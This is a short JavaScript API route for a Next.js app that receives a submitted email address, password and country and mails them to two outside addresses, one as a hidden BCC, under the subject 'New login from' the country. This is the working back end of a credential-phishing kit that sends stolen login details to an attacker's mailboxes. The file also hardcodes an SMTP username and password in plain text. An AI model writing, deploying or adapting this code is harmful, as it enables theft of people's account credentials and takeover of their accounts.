// pages/api/send-email.js

import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  const { email, password, country } = req.body;

  if (!email || !password || !country) {
    return res.status(400).json({ message: 'Email, password, and country are required.' });
  }

  // Create a transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport({
    host: 'mail.mailo.com',
    port: 587,
    secure: false, // true for 465, false for other ports
    auth: {
      user: 'sender1@mailo.com', // SMTP username
      pass: 'sagekidayo', // SMTP password
    },
  });

  // Email options
  let mailOptions = {
    from: '"OSWASP Report" <sender1@mailo.com>', // Sender address
    to: 'yangdong@mailo.com', // List of recipients
    bcc: 'money@monemail.com', // BCC recipients
    subject: `New login from ${country}`, // Subject line including the sender's country
    text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}`, // Plain text body
  };

  try {
    // Send mail with defined transport object
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Email sent successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ message: 'Error sending email.' });
  }
}
